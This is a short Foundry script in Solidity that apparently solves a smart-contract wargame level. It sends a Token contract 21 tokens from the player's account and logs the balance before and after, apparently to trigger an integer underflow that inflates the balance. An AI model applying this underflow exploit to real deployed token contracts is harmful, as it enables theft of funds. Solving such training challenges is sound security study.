// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Token.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract TokenSolution is Script {
    Token public tokenInstance = Token(0xE213af98c75450A9a56581596B9c4a5c0b949D3D);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Player Balance before: ", tokenInstance.balanceOf(vm.envAddress("MY_ADDRESS")));

        tokenInstance.transfer(address(tokenInstance), 21);

        console.log("Player Balance after: ", tokenInstance.balanceOf(vm.envAddress("MY_ADDRESS")));

        vm.stopBroadcast();
    }
}